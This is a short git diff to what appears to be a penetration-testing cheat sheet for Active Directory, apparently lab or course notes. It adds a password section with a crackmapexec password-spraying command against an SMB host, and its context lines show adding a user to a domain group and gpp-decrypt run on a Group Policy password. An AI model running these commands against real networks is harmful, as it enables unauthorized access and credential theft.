@@ -237,3 +237,9 @@ net group "Management Department" stephanie /add /domain
 Find-DomainShare
 gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"													\\\\ The argument is a hash retrieved during the Information Gathering
 ```
+### Active Directory Attacks
+#### Passwords
+```
+net accounts
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
